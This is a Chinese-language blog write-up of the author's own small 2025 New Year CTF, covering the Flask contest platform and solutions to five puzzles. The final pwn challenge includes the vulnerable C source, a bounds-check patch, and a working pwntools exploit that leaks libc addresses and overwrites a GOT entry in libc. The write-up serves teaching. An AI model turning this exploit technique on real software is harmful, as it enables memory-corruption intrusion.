---
title: 2025 新年火箭杯
date: 2025/02/13 14:29:00
updated: 2025/02/13 18:45:00
tags:
    - challenge author
    - got-hijack
    - libc-hook
    - multi-directions
thumbnail: /assets/trueblog/newyear2025/banner.png
excerpt: 去年除夕就搞了“第一届火箭杯”，今年新一届来了！奖金加码到300元，题目增加一题，还搭建了专用平台（虽然没什么人做）。一起来看看平台搭建和题目详解吧
---

去年整了4题，在qq上分发，总共发了200。今年赚了点米，奖金加到了300元，还专门开设了新平台，
由于难度有所上浮，大家做的积极性并不高，不过至少每个方向都有人出。

{% callout green fa-arrow-up-right-from-square %}
现在就可以访问: https://newyear.rocketma.dev
{% endcallout %}

## 手搓平台

既然是如此小型的比赛，自不必使用ctfd等大型平台。为了顺便了解一点前端的知识，
我自己用Flask手搓了一个平台。在使用qwen2.5生成一段起始html后，我就开始自己探索，
完成了剩下网页的构建。我总共花了2天时间来手搓，不得不说，相比以前，有了llm后，
ai写参考代码方便了很多。

{% callout blue fa-warehouse %}
webui现已开源: https://github.com/RocketMaDev/RocketCup2025WebUI
{% endcallout %}

边学边写，我自学了一部分css和js，对于弹窗，采用了js动态注入的方式，同时界面做了一定程度的美化，
看起来应该是比较现代化的。虽然比不过ret2shell等大型平台，但是对于过年小比赛，flag固定的情况来说，
差不多是够用了。REST API部分全部采用GET，基本上遍历了所有情况，不会出什么bug。

最后部署，使用`gunicorn`来分发flask服务，搭建在本机上，通过nginx做反向代理，
绑定到机器的443端口。1Panel确实好用，通过web前端可以很方便地设置let's encrypt的证书，
查看web日志，设置防火墙规则什么的。

{% callout yellow fa-circle-exclamation %}
`torus`是 **MyFonts** 上的专有字体，虽然osu中有用到，但是我没有版权来分发，
因此仓库中没有包含。
{% endcallout %}

## 题解

所有的附件可以在[平台仓库的Releases](https://github.com/RocketMaDev/RocketCup2025WebUI/releases/tag/release)
中找到
### 你的第一个红包！

> NWERFnen0es4yEYA{3cEcd1Es}

看起来像是栅栏编码，一把梭

![fence](/assets/trueblog/newyear2025/fence.png)

{% callout default fa-flag %}
`NEWYEAR{F3nceEnc0de1sE4sy}`
{% endcallout %}

### find $(pwd)

> 下载图片，看看我是从哪里拍的？（不是在拍哪）  
> flag提交格式：`NEWYEAR{str(sha256(f"{经度:.2f},{纬度:.2f}"))[:18]}`

{% folding grey::照片 %}
![](/assets/trueblog/newyear2025/img.jpg)
{% endfolding %}

这张照片拍的是西湖旁边的八卦田，将照片对着地图摆一摆可以推测出我是从其西北处的山上拍的，
在山坡上取一个方便拍照的地，坐标大约是`120.14,30.21`，因此计算其sha256得到flag。

<img src="/assets/trueblog/newyear2025/position.png" height="70%" width="70%">

{% callout default fa-flag %}
`NEWYEAR{2b699aff46606103b4}`
{% endcallout %}

### unpacker

> 真有这么多数据交换格式？  
> 找出压缩包中1234文件分别对应的格式，从其中文维基百科页面提取url的最后一个字段，
> 并用空格拼接起来，sha256后得到flag。  
> 例如：1234分别对应w x y z，w的维基url是https://zh.wikipedia.org/wiki/W ，那么取W。
> w x y z最后得到W X Y Z，使用`sha256(['W', 'X', 'Y', 'Z'].join(' '))[:18]`包上
> `newyear{}`后得到flag。

没啥好说的，就是认格式。从1到4分别是avro, bson, msgpack, protobuf。
计算`sha256('Apache_Avro BSON MessagePack Protocol_Buffers')`

{% callout default fa-flag %}
`NEWYEAR{459794aa79b251ddd8}`
{% endcallout %}

### crackZsh

> 去年是bash脚本逆向，今年zsh脚本卷土重来！

为了方便调试，可以把`verify`中用来处理异常的大括号去掉，然后在发生错误时，
把return码修改方便trace，这样就可以很方便地定位验证进度。
以下是还原后的脚本与配套的解释，可以看出渐进式验证flag的过程。

其中`typeset -A arr`的作用是将其类型设为哈希表。其他的zsh特性可以查阅
[zshguide](https://github.com/goreliu/zshguide)。

```zsh restored.zsh
#!/bin/zsh

print Input your flag to get your red envelop!
read FLAG

verify() {
    typeset -A arr
    FLAG=$1
    # 限定flag长度和起始、末尾
    if [[ $#FLAG -ne 27 ]] || [[ $FLAG[1,8] != "NEWYEAR{" ]] || [[ $FLAG[-1] != "}" ]] {
        return 1
    }
    # NEWYEAR{xxxxxxxxxxxxxxxxxx}
    # date的第6个词是2025，因此第一个字符为2
    tmp=$FLAG[9]
    param=$(printf '{print $%d}' $(($tmp+4)))
    if [[ $(LC_ALL=C date | awk $param) != "2025" ]] {
        return 2
    }
    # NEWYEAR{2xxxxxxxxxxxxxxxxx}
    # 读入当前脚本的内容到buf中，寻找第9字符处的2个字符，即sh
    buf=$(<$2)
    if [[ $buf[(i)$FLAG[10,11]] -ne 9 ]] {
        return 3
    }
    # NEWYEAR{2shxxxxxxxxxxxxxxx}
    # 第12字符处为3
    if [[ $FLAG[$((10 + $tmp))] -ne $(($tmp + 1)) ]] {
        return 4
    }
    # NEWYEAR{2sh3xxxxxxxxxxxxxx}
    # 查表得原始字符串为"Ll"，由于有"C"，因此原先可能是ll，由md5sum可以验证
    arr=(L o r e m I p s u m A l i q o a V e l i t x)
    buf=${(C)${FLAG[13,14]}}
    if [[ "$arr[$buf[1]]$arr[$buf[2]]" != "oi" ]] || [[ $(print $FLAG[13,14] | md5sum | cut -c -5) != "243c4" ]] {
        return 5
    }
    # NEWYEAR{2sh3llxxxxxxxxxxxx}
    # 第15字符处的码位为95，即_
    if [[ $(python -c "print(ord('$FLAG[15]'))") -ne 95 ]] {
        return 6
    }
    # NEWYEAR{2sh3ll_xxxxxxxxxxx}
    # (?? << 2) - 289 == 95，推断出原来是96
    buf=$(($FLAG[16,17] << $tmp))
    if [[ $(python -c "print(chr($buf - 289))") != $FLAG[15] ]] {
        return 7
    }
    # NEWYEAR{2sh3ll_96xxxxxxxxx}
    # 从"96"处截断后，第3 4字符和"96"等同
    buf=$FLAG[16,17]
    tmp=${FLAG#*$buf}
    if [[ $tmp[3,4] != $buf ]] {
        return 8
    }
    # NEWYEAR{2sh3ll_96xx96xxxxx}
    # hex(96 + 96) => 16#C0，取3 4字符小写为c0
    buf=$(([#16] $(($FLAG[16,17] + $FLAG[20,21]))))
    tmp=${buf:l}
    if [[ $tmp[4,5] != $FLAG[18,19] ]] {
        return 9
    }
    # NEWYEAR{2sh3ll_96c096xxxxx}
    # 将22 23字符视为次数，重复向buf附加3个字符，根据buf长度穷举爆破，推得buf长度为45，即这两个字符为15
    buf=
    repeat $FLAG[22,23] {
        buf+=$FLAG[24,26]
    }
    if [[ $(print $#buf | sha256sum | cut -c -5) != "42000" ]] {
        return 10
    }
    # NEWYEAR{2sh3ll_96c09615xxx}
    # 将buf中所有da替换为ad，要求前6个字符为_dca__，在变换前就是d_c_a_，因为字符按3个一组是不断重复的，因此这6个字符就是dacdac
    buf=${buf//da/ad}
    if [[ $buf[2,4] != "dca" ]] {
        return 11
    }
    # NEWYEAR{2sh3ll_96c09615dac}
    return 0
}

verify $FLAG $0
err=$?
if [[ $err -eq 0 ]] {
    print Flag verified, congratulations!
} else {
    print Incorrect flag: $err
}
```

{% callout green fa-heart %}
本题只有 *mantle* 做出，太强了！
{% endcallout %}

{% callout default fa-flag %}
`NEWYEAR{2sh3ll_96c09615dac}`
{% endcallout %}

### put?env!

> Flag放在环境变量里，但是要被覆写了😨  
> 沙箱中除了read和write以外的系统调用，都只是为了让程序不似，不是用来利用的  
> libc是2.35-0ubuntu3.8_amd64  
> nc newyear.rocketma.dev 1337

{% folding purple::题目源码 %}
```c putenv.c
#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <seccomp.h>

void sandbox(void) {
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx)
        goto kill;
    int rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(newfstatat), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
    if (rc < 0)
        goto kill;
    rc = seccomp_load(ctx);
    if (rc < 0)
        goto kill;
    return;
kill:
    exit(-1);
}

int main(void) {
    setbuf(stdout, NULL);
    unsigned long arr[3] = {0x2025, 0x6666, 0x8888};
    puts("Happy 2025!");
    puts("You got one chance to set value");
    long recv = 0;
    bool done = false;
    sandbox();
    do {
        puts("Which to set?");
        printf("IDX > ");
        int err = scanf("%ld", &recv);
        while (getchar() != '\n');
        if (!err)
            continue;
        if (recv >= 3)
            puts("No way!!");
        else {
            printf("Is this what you want? %#lx\n", arr[recv]);
            printf("[Y/n] ");
            int ch = getchar();
            if (ch == '\n' || (getchar(), ch == 'y'))
                done = true;
        }
    } while (!done);
    done = false;
    do {
        puts("Tell me what you want");
        printf("VAL > ");
        int err = scanf("%ld", arr + recv);
        if (!err) {
            while (getchar() != '\n');
            continue;
        }
        done = true;
    } while (!done);
    puts("Now the FLAG is gone!");
    setenv("FLAG", "", 1);
    return 0;
}
```
{% endfolding %}

保护全开，64位。由于libc是2.35，因此got表可写。这道题的出题思路其实来源于今年强网杯，
看狼组的wp时发现有非预期可以读环境变量。查看源码可知，`setenv`调用`__add_to_environ`，
而在`__add_to_environ`中，有一个遍历所有环境变量的地方：

```c stdlib/setenv.c
  ep = __environ;

  size = 0;
  if (ep != NULL)
    {
      for (; *ep != NULL; ++ep)
        if (!strncmp (*ep, name, namelen) && (*ep)[namelen] == '=')
          break;
        else
          ++size;
    }
```

在这个地方不难看出所有环境变量都会经历一遍`strncmp`，并且第一个参数恰好是环境变量字符串。
不难想到，如果把`strncmp`的got绑定到`puts`，就可以泄露所有环境变量。由于`puts`
的返回值是打印的字符数，因此不会出现进入&&分支。

因为我禁用了几乎所有系统调用，并且只能写一个QWORD，所以大概没有什么非预期，
直到 *山西小嫦娥* 来向我反馈。

{% callout green fa-heart %}
感谢 *山西小嫦娥* 的反馈！
{% endcallout %}

由于指针是无符号数，而输入时`recv`需要乘以8才会与指针相加，因此完全可以通过控制输入，
使得`recv * 8`为大于3的正数，从而实现环境变量区的任意读。于是我加了以下这一条patch
来使得这个trick也不能通过检查。

```diff fix-wrap-arround.patch
--- putenv.c
+++ putenv.c
@@ -56,3 +56,3 @@
             continue;
-        if (recv >= 3)
+        if (recv >= 3 || arr + recv > arr + 3)
             puts("No way!!");
```

{% callout blue fa-face-sad-tear %}
然而，我在重新编译程序后，确实更新了xinetd服务的二进制，却忘记更新web服务分发的二进制。
也就是说，修补后网页上分发的程序和实际跑的程序并不是同一个，并且相关的偏移也变了，
因此写出“正确”的脚本也有可能打不通，向大家道歉。
{% endcallout %}

最后，解题思路就是从栈上获取libc基址和栈基址，计算得到`libc.got['strncmp']`的位置，
利用唯一的一次修改，将其改为`puts`，这样在`setenv`时就会打印出所有flag。exp：

```python putenv.py
from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './putenv'

def payload(lo: int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('newyear.rocketma.dev', 1337)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

    def select(idx: int, goon: bool) -> int:
        assert idx < 3
        sh.sendlineafter(b'IDX', str(idx).encode())
        sh.recvuntil(b'want?')
        key = int(sh.recvline(), 16)
        sh.sendlineafter(b'Y/n', b'n' if goon else b'y')
        return key

    libcBase = select(-15, True) - libc.symbols['_IO_2_1_stdout_']
    success(GOLD_TEXT(f"Leak libcBase: {libcBase:#x}"))
    libc.address = libcBase

    arrayBase = select(-6, True) + 8
    success(GOLD_TEXT(f"Leak arrayBase: {arrayBase:#x}"))

    select((libc.got['strncmp'] - arrayBase) // 8, False)
    sh.sendlineafter(b'VAL', str(libc.symbols['puts']).encode())

    sh.recvuntil(b'NEWYEAR{')
    flag = b'NEWYEAR{' + sh.recvuntil(b'}')
    success(f"Flag is: {flag.decode('utf-8')}")
    sh.close()
```

{% callout default fa-flag %}
![](/assets/trueblog/newyear2025/flag.png)
{% endcallout %}

## 参考

[Zsh 开发指南](https://github.com/goreliu/zshguide)
